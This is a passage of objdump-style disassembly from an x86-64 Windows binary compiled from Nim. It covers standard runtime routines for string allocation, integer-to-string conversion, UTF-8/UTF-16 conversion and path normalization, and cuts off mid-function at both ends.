  403f7c:	8a 54 0b 03          	mov    0x3(%rbx,%rcx,1),%dl
  403f80:	49 c1 e4 12          	shl    $0x12,%r12
  403f84:	41 81 e4 00 00 1c 00 	and    $0x1c0000,%r12d
  403f8b:	83 e2 3f             	and    $0x3f,%edx
  403f8e:	4c 09 e2             	or     %r12,%rdx
  403f91:	44 0f b6 64 0b 01    	movzbl 0x1(%rbx,%rcx,1),%r12d
  403f97:	49 c1 e4 0c          	shl    $0xc,%r12
  403f9b:	41 81 e4 00 f0 03 00 	and    $0x3f000,%r12d
  403fa2:	4c 09 e2             	or     %r12,%rdx
  403fa5:	44 0f b6 64 0b 02    	movzbl 0x2(%rbx,%rcx,1),%r12d
  403fab:	48 83 c1 04          	add    $0x4,%rcx
  403faf:	49 c1 e4 06          	shl    $0x6,%r12
  403fb3:	41 81 e4 c0 0f 00 00 	and    $0xfc0,%r12d
  403fba:	4c 09 e2             	or     %r12,%rdx
  403fbd:	48 81 fa ff ff 00 00 	cmp    $0xffff,%rdx
  403fc4:	7e 37                	jle    403ffd <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x17d>
  403fc6:	48 81 fa ff ff 10 00 	cmp    $0x10ffff,%rdx
  403fcd:	7f 46                	jg     404015 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x195>
  403fcf:	48 81 ea 00 00 01 00 	sub    $0x10000,%rdx
  403fd6:	49 ff c0             	inc    %r8
  403fd9:	49 89 d4             	mov    %rdx,%r12
  403fdc:	66 81 e2 ff 03       	and    $0x3ff,%dx
  403fe1:	49 c1 fc 0a          	sar    $0xa,%r12
  403fe5:	66 81 ea 00 24       	sub    $0x2400,%dx
  403fea:	66 41 81 ec 00 28    	sub    $0x2800,%r12w
  403ff0:	66 44 89 65 00       	mov    %r12w,0x0(%rbp)
  403ff5:	66 42 89 54 08 02    	mov    %dx,0x2(%rax,%r9,1)
  403ffb:	eb 1e                	jmp    40401b <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x19b>
  403ffd:	48 81 fa ff d7 00 00 	cmp    $0xd7ff,%rdx
  404004:	7e 09                	jle    40400f <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x18f>
  404006:	48 81 fa ff df 00 00 	cmp    $0xdfff,%rdx
  40400d:	7e 06                	jle    404015 <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x195>
  40400f:	66 89 55 00          	mov    %dx,0x0(%rbp)
  404013:	eb 06                	jmp    40401b <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x19b>
  404015:	66 c7 45 00 fd ff    	movw   $0xfffd,0x0(%rbp)
  40401b:	49 ff c0             	inc    %r8
  40401e:	e9 9a fe ff ff       	jmp    403ebd <newWideCString__K8rR70TBwrP6FNBzDhVVOA+0x3d>
  404023:	66 c7 45 00 00 00    	movw   $0x0,0x0(%rbp)
  404029:	48 83 c4 20          	add    $0x20,%rsp
  40402d:	5b                   	pop    %rbx
  40402e:	5e                   	pop    %rsi
  40402f:	5f                   	pop    %rdi
  404030:	5d                   	pop    %rbp
  404031:	41 5c                	pop    %r12
  404033:	c3                   	ret

0000000000404034 <newWideCString__rFkWhJjmVi0m0Hc9agVEZIQ>:
  404034:	48 83 ec 28          	sub    $0x28,%rsp
  404038:	31 d2                	xor    %edx,%edx
  40403a:	48 85 c9             	test   %rcx,%rcx
  40403d:	74 03                	je     404042 <newWideCString__rFkWhJjmVi0m0Hc9agVEZIQ+0xe>
  40403f:	48 8b 11             	mov    (%rcx),%rdx
  404042:	e8 0a d5 ff ff       	call   401551 <nimToCStringConv.lto_priv.52>
  404047:	48 89 c1             	mov    %rax,%rcx
  40404a:	48 83 c4 28          	add    $0x28,%rsp
  40404e:	e9 2d fe ff ff       	jmp    403e80 <newWideCString__K8rR70TBwrP6FNBzDhVVOA>

0000000000404053 <rawNewStringNoInit>:
  404053:	57                   	push   %rdi
  404054:	56                   	push   %rsi
  404055:	53                   	push   %rbx
  404056:	48 83 ec 20          	sub    $0x20,%rsp
  40405a:	be 07 00 00 00       	mov    $0x7,%esi
  40405f:	48 83 f9 07          	cmp    $0x7,%rcx
  404063:	48 0f 4d f1          	cmovge %rcx,%rsi
  404067:	e8 34 dc ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  40406c:	48 8d 78 38          	lea    0x38(%rax),%rdi
  404070:	48 89 c3             	mov    %rax,%rbx
  404073:	48 89 f9             	mov    %rdi,%rcx
  404076:	e8 65 f7 ff ff       	call   4037e0 <collectCT__XHio9cMpnLoH7GyCj1Z9besg>
  40407b:	48 8d 56 21          	lea    0x21(%rsi),%rdx
  40407f:	48 8d 8b a0 00 00 00 	lea    0xa0(%rbx),%rcx
  404086:	e8 dc e8 ff ff       	call   402967 <rawAlloc__mE4QEVyMvGRVliDWDngZCQ>
  40408b:	48 89 fa             	mov    %rdi,%rdx
  40408e:	48 89 c3             	mov    %rax,%rbx
  404091:	48 8d 05 88 6f 00 00 	lea    0x6f88(%rip),%rax        # 40b020 <strDesc__D0UzA4zsDu5tgpJQ9a9clXPg>
  404098:	48 c7 03 04 00 00 00 	movq   $0x4,(%rbx)
  40409f:	48 89 d9             	mov    %rbx,%rcx
  4040a2:	48 89 43 08          	mov    %rax,0x8(%rbx)
  4040a6:	e8 20 eb ff ff       	call   402bcb <addNewObjToZCT__xkq8ZbJr9bIUKHN9cK4tT5NAsystem.constprop.46>
  4040ab:	48 8d 43 10          	lea    0x10(%rbx),%rax
  4040af:	48 89 70 08          	mov    %rsi,0x8(%rax)
  4040b3:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
  4040ba:	00 
  4040bb:	48 83 c4 20          	add    $0x20,%rsp
  4040bf:	5b                   	pop    %rbx
  4040c0:	5e                   	pop    %rsi
  4040c1:	5f                   	pop    %rdi
  4040c2:	c3                   	ret

00000000004040c3 <copyString>:
  4040c3:	57                   	push   %rdi
  4040c4:	56                   	push   %rsi
  4040c5:	48 83 ec 28          	sub    $0x28,%rsp
  4040c9:	48 85 c9             	test   %rcx,%rcx
  4040cc:	48 89 ce             	mov    %rcx,%rsi
  4040cf:	74 29                	je     4040fa <copyString+0x37>
  4040d1:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
  4040d6:	78 22                	js     4040fa <copyString+0x37>
  4040d8:	48 8b 09             	mov    (%rcx),%rcx
  4040db:	48 83 c6 10          	add    $0x10,%rsi
  4040df:	e8 6f ff ff ff       	call   404053 <rawNewStringNoInit>
  4040e4:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
  4040e8:	48 8d 50 10          	lea    0x10(%rax),%rdx
  4040ec:	48 89 d7             	mov    %rdx,%rdi
  4040ef:	48 89 08             	mov    %rcx,(%rax)
  4040f2:	48 ff c1             	inc    %rcx
  4040f5:	f3 a4                	rep movsb (%rsi),(%rdi)
  4040f7:	48 89 c6             	mov    %rax,%rsi
  4040fa:	48 89 f0             	mov    %rsi,%rax
  4040fd:	48 83 c4 28          	add    $0x28,%rsp
  404101:	5e                   	pop    %rsi
  404102:	5f                   	pop    %rdi
  404103:	c3                   	ret

0000000000404104 <setLengthStr>:
  404104:	41 55                	push   %r13
  404106:	41 54                	push   %r12
  404108:	55                   	push   %rbp
  404109:	57                   	push   %rdi
  40410a:	56                   	push   %rsi
  40410b:	53                   	push   %rbx
  40410c:	48 83 ec 28          	sub    $0x28,%rsp
  404110:	41 bc 00 00 00 00    	mov    $0x0,%r12d
  404116:	48 85 d2             	test   %rdx,%rdx
  404119:	48 89 cb             	mov    %rcx,%rbx
  40411c:	48 89 d5             	mov    %rdx,%rbp
  40411f:	4c 0f 49 e2          	cmovns %rdx,%r12
  404123:	48 85 c9             	test   %rcx,%rcx
  404126:	74 60                	je     404188 <setLengthStr+0x84>
  404128:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  40412f:	ff ff 3f 
  404132:	48 23 4b 08          	and    0x8(%rbx),%rcx
  404136:	4c 39 e1             	cmp    %r12,%rcx
  404139:	7d 5b                	jge    404196 <setLengthStr+0x92>
  40413b:	e8 9d d4 ff ff       	call   4015dd <resize__cOCDWr16YD4j3dBrbbH3yQsystem>
  404140:	48 8d 73 10          	lea    0x10(%rbx),%rsi
  404144:	48 39 c5             	cmp    %rax,%rbp
  404147:	48 0f 4d c5          	cmovge %rbp,%rax
  40414b:	48 89 c1             	mov    %rax,%rcx
  40414e:	49 89 c5             	mov    %rax,%r13
  404151:	e8 fd fe ff ff       	call   404053 <rawNewStringNoInit>
  404156:	48 8b 0b             	mov    (%rbx),%rcx
  404159:	48 89 ea             	mov    %rbp,%rdx
  40415c:	49 89 c1             	mov    %rax,%r9
  40415f:	48 8d 40 10          	lea    0x10(%rax),%rax
  404163:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
  404167:	48 89 c7             	mov    %rax,%rdi
  40416a:	48 ff c1             	inc    %rcx
  40416d:	f3 a4                	rep movsb (%rsi),(%rdi)
  40416f:	48 8b 03             	mov    (%rbx),%rax
  404172:	49 8d 4c 01 10       	lea    0x10(%r9,%rax,1),%rcx
  404177:	48 29 c2             	sub    %rax,%rdx
  40417a:	e8 43 d8 ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  40417f:	4d 89 69 08          	mov    %r13,0x8(%r9)
  404183:	4c 89 cb             	mov    %r9,%rbx
  404186:	eb 0e                	jmp    404196 <setLengthStr+0x92>
  404188:	48 89 d1             	mov    %rdx,%rcx
  40418b:	e8 bc fb ff ff       	call   403d4c <rawNewString>
  404190:	48 89 c3             	mov    %rax,%rbx
  404193:	48 89 28             	mov    %rbp,(%rax)
  404196:	48 89 d8             	mov    %rbx,%rax
  404199:	4c 89 23             	mov    %r12,(%rbx)
  40419c:	42 c6 44 23 10 00    	movb   $0x0,0x10(%rbx,%r12,1)
  4041a2:	48 83 c4 28          	add    $0x28,%rsp
  4041a6:	5b                   	pop    %rbx
  4041a7:	5e                   	pop    %rsi
  4041a8:	5f                   	pop    %rdi
  4041a9:	5d                   	pop    %rbp
  4041aa:	41 5c                	pop    %r12
  4041ac:	41 5d                	pop    %r13
  4041ae:	c3                   	ret

00000000004041af <nimIntToStr>:
  4041af:	41 56                	push   %r14
  4041b1:	41 55                	push   %r13
  4041b3:	41 54                	push   %r12
  4041b5:	55                   	push   %rbp
  4041b6:	57                   	push   %rdi
  4041b7:	56                   	push   %rsi
  4041b8:	53                   	push   %rbx
  4041b9:	48 83 ec 30          	sub    $0x30,%rsp
  4041bd:	31 f6                	xor    %esi,%esi
  4041bf:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  4041c6:	00 00 
  4041c8:	48 89 cb             	mov    %rcx,%rbx
  4041cb:	b9 20 00 00 00       	mov    $0x20,%ecx
  4041d0:	e8 77 fb ff ff       	call   403d4c <rawNewString>
  4041d5:	48 85 c0             	test   %rax,%rax
  4041d8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  4041dd:	74 03                	je     4041e2 <nimIntToStr+0x33>
  4041df:	48 8b 30             	mov    (%rax),%rsi
  4041e2:	48 8d 56 20          	lea    0x20(%rsi),%rdx
  4041e6:	48 89 c1             	mov    %rax,%rcx
  4041e9:	41 bc 0a 00 00 00    	mov    $0xa,%r12d
  4041ef:	e8 10 ff ff ff       	call   404104 <setLengthStr>
  4041f4:	48 8d 6c 24 28       	lea    0x28(%rsp),%rbp
  4041f9:	41 b5 0a             	mov    $0xa,%r13b
  4041fc:	41 b6 30             	mov    $0x30,%r14b
  4041ff:	48 89 e9             	mov    %rbp,%rcx
  404202:	48 89 c2             	mov    %rax,%rdx
  404205:	e8 b8 ec ff ff       	call   402ec2 <unsureAsgnRef>
  40420a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  40420f:	49 89 d8             	mov    %rbx,%r8
  404212:	45 31 c9             	xor    %r9d,%r9d
  404215:	4c 8d 1c 31          	lea    (%rcx,%rsi,1),%r11
  404219:	4c 89 c0             	mov    %r8,%rax
  40421c:	48 99                	cqto
  40421e:	49 f7 fc             	idiv   %r12
  404221:	49 89 c2             	mov    %rax,%r10
  404224:	44 89 e8             	mov    %r13d,%eax
  404227:	49 6b d2 f6          	imul   $0xfffffffffffffff6,%r10,%rdx
  40422b:	41 0f af c2          	imul   %r10d,%eax
  40422f:	4c 01 c2             	add    %r8,%rdx
  404232:	48 85 d2             	test   %rdx,%rdx
  404235:	7e 09                	jle    404240 <nimIntToStr+0x91>
  404237:	41 83 c0 30          	add    $0x30,%r8d
  40423b:	41 29 c0             	sub    %eax,%r8d
  40423e:	eb 0c                	jmp    40424c <nimIntToStr+0x9d>
  404240:	44 89 f7             	mov    %r14d,%edi
  404243:	44 29 c7             	sub    %r8d,%edi
  404246:	41 89 f8             	mov    %edi,%r8d
  404249:	41 01 c0             	add    %eax,%r8d
  40424c:	47 88 44 0b 10       	mov    %r8b,0x10(%r11,%r9,1)
  404251:	49 8d 79 01          	lea    0x1(%r9),%rdi
  404255:	4d 85 d2             	test   %r10,%r10
  404258:	4d 89 d0             	mov    %r10,%r8
  40425b:	74 05                	je     404262 <nimIntToStr+0xb3>
  40425d:	49 89 f9             	mov    %rdi,%r9
  404260:	eb b7                	jmp    404219 <nimIntToStr+0x6a>
  404262:	48 85 db             	test   %rbx,%rbx
  404265:	79 0a                	jns    404271 <nimIntToStr+0xc2>
  404267:	42 c6 44 1f 10 2d    	movb   $0x2d,0x10(%rdi,%r11,1)
  40426d:	49 8d 79 02          	lea    0x2(%r9),%rdi
  404271:	48 8d 1c 3e          	lea    (%rsi,%rdi,1),%rbx
  404275:	48 d1 ff             	sar    $1,%rdi
  404278:	48 89 da             	mov    %rbx,%rdx
  40427b:	e8 84 fe ff ff       	call   404104 <setLengthStr>
  404280:	48 89 e9             	mov    %rbp,%rcx
  404283:	48 89 c2             	mov    %rax,%rdx
  404286:	e8 37 ec ff ff       	call   402ec2 <unsureAsgnRef>
  40428b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  404290:	49 89 f8             	mov    %rdi,%r8
  404293:	48 8d 0c 30          	lea    (%rax,%rsi,1),%rcx
  404297:	48 8d 14 18          	lea    (%rax,%rbx,1),%rdx
  40429b:	49 01 c8             	add    %rcx,%r8
  40429e:	48 ff ca             	dec    %rdx
  4042a1:	49 39 c8             	cmp    %rcx,%r8
  4042a4:	74 15                	je     4042bb <nimIntToStr+0x10c>
  4042a6:	44 8a 49 10          	mov    0x10(%rcx),%r9b
  4042aa:	48 ff c1             	inc    %rcx
  4042ad:	44 8a 52 10          	mov    0x10(%rdx),%r10b
  4042b1:	44 88 51 0f          	mov    %r10b,0xf(%rcx)
  4042b5:	44 88 4a 10          	mov    %r9b,0x10(%rdx)
  4042b9:	eb e3                	jmp    40429e <nimIntToStr+0xef>
  4042bb:	48 83 c4 30          	add    $0x30,%rsp
  4042bf:	5b                   	pop    %rbx
  4042c0:	5e                   	pop    %rsi
  4042c1:	5f                   	pop    %rdi
  4042c2:	5d                   	pop    %rbp
  4042c3:	41 5c                	pop    %r12
  4042c5:	41 5d                	pop    %r13
  4042c7:	41 5e                	pop    %r14
  4042c9:	c3                   	ret

00000000004042ca <addChar>:
  4042ca:	55                   	push   %rbp
  4042cb:	57                   	push   %rdi
  4042cc:	56                   	push   %rsi
  4042cd:	53                   	push   %rbx
  4042ce:	48 83 ec 28          	sub    $0x28,%rsp
  4042d2:	48 85 c9             	test   %rcx,%rcx
  4042d5:	48 89 ce             	mov    %rcx,%rsi
  4042d8:	89 d3                	mov    %edx,%ebx
  4042da:	74 43                	je     40431f <addChar+0x55>
  4042dc:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
  4042e3:	ff ff 3f 
  4042e6:	48 23 4e 08          	and    0x8(%rsi),%rcx
  4042ea:	48 3b 0e             	cmp    (%rsi),%rcx
  4042ed:	7f 44                	jg     404333 <addChar+0x69>
  4042ef:	e8 e9 d2 ff ff       	call   4015dd <resize__cOCDWr16YD4j3dBrbbH3yQsystem>
  4042f4:	48 83 c6 10          	add    $0x10,%rsi
  4042f8:	48 89 c1             	mov    %rax,%rcx
  4042fb:	48 89 c5             	mov    %rax,%rbp
  4042fe:	e8 50 fd ff ff       	call   404053 <rawNewStringNoInit>
  404303:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
  404307:	48 8d 50 10          	lea    0x10(%rax),%rdx
  40430b:	48 89 d7             	mov    %rdx,%rdi
  40430e:	48 89 08             	mov    %rcx,(%rax)
  404311:	48 ff c1             	inc    %rcx
  404314:	f3 a4                	rep movsb (%rsi),(%rdi)
  404316:	48 89 68 08          	mov    %rbp,0x8(%rax)
  40431a:	48 89 c6             	mov    %rax,%rsi
  40431d:	eb 14                	jmp    404333 <addChar+0x69>
  40431f:	b9 01 00 00 00       	mov    $0x1,%ecx
  404324:	e8 2a fd ff ff       	call   404053 <rawNewStringNoInit>
  404329:	48 89 c6             	mov    %rax,%rsi
  40432c:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  404333:	48 8b 06             	mov    (%rsi),%rax
  404336:	88 5c 06 10          	mov    %bl,0x10(%rsi,%rax,1)
  40433a:	c6 44 06 11 00       	movb   $0x0,0x11(%rsi,%rax,1)
  40433f:	48 ff c0             	inc    %rax
  404342:	48 89 06             	mov    %rax,(%rsi)
  404345:	48 89 f0             	mov    %rsi,%rax
  404348:	48 83 c4 28          	add    $0x28,%rsp
  40434c:	5b                   	pop    %rbx
  40434d:	5e                   	pop    %rsi
  40434e:	5f                   	pop    %rdi
  40434f:	5d                   	pop    %rbp
  404350:	c3                   	ret

0000000000404351 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43>:
  404351:	55                   	push   %rbp
  404352:	57                   	push   %rdi
  404353:	56                   	push   %rsi
  404354:	53                   	push   %rbx
  404355:	48 83 ec 28          	sub    $0x28,%rsp
  404359:	48 89 cd             	mov    %rcx,%rbp
  40435c:	48 89 d1             	mov    %rdx,%rcx
  40435f:	48 c1 f9 02          	sar    $0x2,%rcx
  404363:	48 01 d1             	add    %rdx,%rcx
  404366:	e8 e1 f9 ff ff       	call   403d4c <rawNewString>
  40436b:	31 c9                	xor    %ecx,%ecx
  40436d:	48 8d 14 09          	lea    (%rcx,%rcx,1),%rdx
  404371:	66 8b 74 15 00       	mov    0x0(%rbp,%rdx,1),%si
  404376:	66 85 f6             	test   %si,%si
  404379:	0f 84 39 01 00 00    	je     4044b8 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x167>
  40437f:	48 8d 79 01          	lea    0x1(%rcx),%rdi
  404383:	66 81 fe ff d7       	cmp    $0xd7ff,%si
  404388:	0f b7 de             	movzwl %si,%ebx
  40438b:	77 0b                	ja     404398 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x47>
  40438d:	48 81 fb ff d7 00 00 	cmp    $0xd7ff,%rbx
  404394:	7f 2c                	jg     4043c2 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x71>
  404396:	eb 1e                	jmp    4043b6 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x65>
  404398:	48 81 fb ff db 00 00 	cmp    $0xdbff,%rbx
  40439f:	7e 21                	jle    4043c2 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x71>
  4043a1:	48 81 fb ff df 00 00 	cmp    $0xdfff,%rbx
  4043a8:	0f 9e c2             	setle  %dl
  4043ab:	66 81 fe ff db       	cmp    $0xdbff,%si
  4043b0:	0f 87 80 00 00 00    	ja     404436 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0xe5>
  4043b6:	48 81 fb ff db 00 00 	cmp    $0xdbff,%rbx
  4043bd:	0f 9f c2             	setg   %dl
  4043c0:	eb 74                	jmp    404436 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0xe5>
  4043c2:	44 0f b7 44 15 02    	movzwl 0x2(%rbp,%rdx,1),%r8d
  4043c8:	66 41 81 f8 ff db    	cmp    $0xdbff,%r8w
  4043ce:	4c 89 c2             	mov    %r8,%rdx
  4043d1:	77 0d                	ja     4043e0 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x8f>
  4043d3:	49 81 f8 ff db 00 00 	cmp    $0xdbff,%r8
  4043da:	41 0f 9f c0          	setg   %r8b
  4043de:	eb 0b                	jmp    4043eb <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x9a>
  4043e0:	49 81 f8 ff df 00 00 	cmp    $0xdfff,%r8
  4043e7:	41 0f 9e c0          	setle  %r8b
  4043eb:	45 84 c0             	test   %r8b,%r8b
  4043ee:	0f 84 87 00 00 00    	je     40447b <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x12a>
  4043f4:	48 8d 79 02          	lea    0x2(%rcx),%rdi
  4043f8:	48 c1 e3 0a          	shl    $0xa,%rbx
  4043fc:	81 e2 ff 03 00 00    	and    $0x3ff,%edx
  404402:	81 e3 00 fc 0f 00    	and    $0xffc00,%ebx
  404408:	48 89 c1             	mov    %rax,%rcx
  40440b:	48 09 d3             	or     %rdx,%rbx
  40440e:	48 81 c3 00 00 01 00 	add    $0x10000,%rbx
  404415:	48 89 da             	mov    %rbx,%rdx
  404418:	48 c1 fa 12          	sar    $0x12,%rdx
  40441c:	83 ca f0             	or     $0xfffffff0,%edx
  40441f:	0f be d2             	movsbl %dl,%edx
  404422:	e8 a3 fe ff ff       	call   4042ca <addChar>
  404427:	48 89 da             	mov    %rbx,%rdx
  40442a:	48 c1 fa 0c          	sar    $0xc,%rdx
  40442e:	83 e2 3f             	and    $0x3f,%edx
  404431:	83 ca 80             	or     $0xffffff80,%edx
  404434:	eb 54                	jmp    40448a <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x139>
  404436:	84 d2                	test   %dl,%dl
  404438:	75 41                	jne    40447b <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x12a>
  40443a:	66 83 fe 7f          	cmp    $0x7f,%si
  40443e:	0f b7 d6             	movzwl %si,%edx
  404441:	76 28                	jbe    40446b <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x11a>
  404443:	48 89 da             	mov    %rbx,%rdx
  404446:	48 c1 fa 06          	sar    $0x6,%rdx
  40444a:	48 81 fb ff 07 00 00 	cmp    $0x7ff,%rbx
  404451:	7f 2d                	jg     404480 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x12f>
  404453:	83 ca c0             	or     $0xffffffc0,%edx
  404456:	83 e6 3f             	and    $0x3f,%esi
  404459:	48 89 c1             	mov    %rax,%rcx
  40445c:	0f be d2             	movsbl %dl,%edx
  40445f:	83 ce 80             	or     $0xffffff80,%esi
  404462:	e8 63 fe ff ff       	call   4042ca <addChar>
  404467:	40 0f be d6          	movsbl %sil,%edx
  40446b:	48 89 c1             	mov    %rax,%rcx
  40446e:	e8 57 fe ff ff       	call   4042ca <addChar>
  404473:	48 89 f9             	mov    %rdi,%rcx
  404476:	e9 f2 fe ff ff       	jmp    40436d <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x1c>
  40447b:	bb fd ff 00 00       	mov    $0xfffd,%ebx
  404480:	48 89 da             	mov    %rbx,%rdx
  404483:	48 c1 fa 0c          	sar    $0xc,%rdx
  404487:	83 ca e0             	or     $0xffffffe0,%edx
  40448a:	0f be d2             	movsbl %dl,%edx
  40448d:	48 89 c1             	mov    %rax,%rcx
  404490:	e8 35 fe ff ff       	call   4042ca <addChar>
  404495:	48 89 da             	mov    %rbx,%rdx
  404498:	83 e3 3f             	and    $0x3f,%ebx
  40449b:	48 c1 fa 06          	sar    $0x6,%rdx
  40449f:	48 89 c1             	mov    %rax,%rcx
  4044a2:	83 cb 80             	or     $0xffffff80,%ebx
  4044a5:	83 e2 3f             	and    $0x3f,%edx
  4044a8:	83 ca 80             	or     $0xffffff80,%edx
  4044ab:	0f be d2             	movsbl %dl,%edx
  4044ae:	e8 17 fe ff ff       	call   4042ca <addChar>
  4044b3:	0f be d3             	movsbl %bl,%edx
  4044b6:	eb b3                	jmp    40446b <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.43+0x11a>
  4044b8:	48 83 c4 28          	add    $0x28,%rsp
  4044bc:	5b                   	pop    %rbx
  4044bd:	5e                   	pop    %rsi
  4044be:	5f                   	pop    %rdi
  4044bf:	5d                   	pop    %rbp
  4044c0:	c3                   	ret

00000000004044c1 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg>:
  4044c1:	53                   	push   %rbx
  4044c2:	48 83 ec 20          	sub    $0x20,%rsp
  4044c6:	48 89 cb             	mov    %rcx,%rbx
  4044c9:	48 8b 09             	mov    (%rcx),%rcx
  4044cc:	41 89 d1             	mov    %edx,%r9d
  4044cf:	48 85 c9             	test   %rcx,%rcx
  4044d2:	0f 84 96 00 00 00    	je     40456e <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0xad>
  4044d8:	48 8b 11             	mov    (%rcx),%rdx
  4044db:	48 85 d2             	test   %rdx,%rdx
  4044de:	0f 84 8a 00 00 00    	je     40456e <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0xad>
  4044e4:	48 85 d2             	test   %rdx,%rdx
  4044e7:	7e 39                	jle    404522 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x61>
  4044e9:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
  4044ed:	44 8a 44 01 10       	mov    0x10(%rcx,%rax,1),%r8b
  4044f2:	41 80 f8 5c          	cmp    $0x5c,%r8b
  4044f6:	75 05                	jne    4044fd <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x3c>
  4044f8:	48 89 c2             	mov    %rax,%rdx
  4044fb:	eb e7                	jmp    4044e4 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x23>
  4044fd:	41 80 f8 2f          	cmp    $0x2f,%r8b
  404501:	74 f5                	je     4044f8 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x37>
  404503:	41 80 f8 2e          	cmp    $0x2e,%r8b
  404507:	75 4b                	jne    404554 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x93>
  404509:	48 83 fa 01          	cmp    $0x1,%rdx
  40450d:	7e 45                	jle    404554 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x93>
  40450f:	44 8a 44 01 0f       	mov    0xf(%rcx,%rax,1),%r8b
  404514:	41 80 f8 5c          	cmp    $0x5c,%r8b
  404518:	74 de                	je     4044f8 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x37>
  40451a:	41 80 f8 2f          	cmp    $0x2f,%r8b
  40451e:	74 d8                	je     4044f8 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x37>
  404520:	eb 32                	jmp    404554 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x93>
  404522:	45 84 c9             	test   %r9b,%r9b
  404525:	74 1f                	je     404546 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x85>
  404527:	e8 d8 fb ff ff       	call   404104 <setLengthStr>
  40452c:	48 89 d9             	mov    %rbx,%rcx
  40452f:	48 89 c2             	mov    %rax,%rdx
  404532:	e8 8b e9 ff ff       	call   402ec2 <unsureAsgnRef>
  404537:	48 8b 0b             	mov    (%rbx),%rcx
  40453a:	ba 5c 00 00 00       	mov    $0x5c,%edx
  40453f:	e8 86 fd ff ff       	call   4042ca <addChar>
  404544:	eb 18                	jmp    40455e <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x9d>
  404546:	48 8d 0d 23 ce 00 00 	lea    0xce23(%rip),%rcx        # 411370 <TM__yu6cxgKBBXbNsTkT9cyMd4g_6>
  40454d:	e8 71 fb ff ff       	call   4040c3 <copyString>
  404552:	eb 0a                	jmp    40455e <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x9d>
  404554:	45 84 c9             	test   %r9b,%r9b
  404557:	75 ce                	jne    404527 <normalizePathEnd__gKUeJXj8CrWvxdeNCA2BXg+0x66>
  404559:	e8 a6 fb ff ff       	call   404104 <setLengthStr>
  40455e:	48 89 c2             	mov    %rax,%rdx
  404561:	48 89 d9             	mov    %rbx,%rcx
  404564:	48 83 c4 20          	add    $0x20,%rsp
  404568:	5b                   	pop    %rbx
  404569:	e9 54 e9 ff ff       	jmp    402ec2 <unsureAsgnRef>
  40456e:	48 83 c4 20          	add    $0x20,%rsp
  404572:	5b                   	pop    %rbx
  404573:	c3                   	ret

0000000000404574 <add__8FwY5enLGB0dFerO6Ny9caw.part.19>:
  404574:	56                   	push   %rsi
  404575:	53                   	push   %rbx
  404576:	48 83 ec 28          	sub    $0x28,%rsp
  40457a:	48 89 ce             	mov    %rcx,%rsi
  40457d:	48 89 d3             	mov    %rdx,%rbx
  404580:	48 ff c3             	inc    %rbx
  404583:	0f be 53 ff          	movsbl -0x1(%rbx),%edx
  404587:	84 d2                	test   %dl,%dl
  404589:	74 15                	je     4045a0 <add__8FwY5enLGB0dFerO6Ny9caw.part.19+0x2c>
  40458b:	48 8b 0e             	mov    (%rsi),%rcx
  40458e:	e8 37 fd ff ff       	call   4042ca <addChar>
  404593:	48 89 f1             	mov    %rsi,%rcx
  404596:	48 89 c2             	mov    %rax,%rdx
  404599:	e8 24 e9 ff ff       	call   402ec2 <unsureAsgnRef>
  40459e:	eb e0                	jmp    404580 <add__8FwY5enLGB0dFerO6Ny9caw.part.19+0xc>
  4045a0:	48 83 c4 28          	add    $0x28,%rsp
  4045a4:	5b                   	pop    %rbx
  4045a5:	5e                   	pop    %rsi
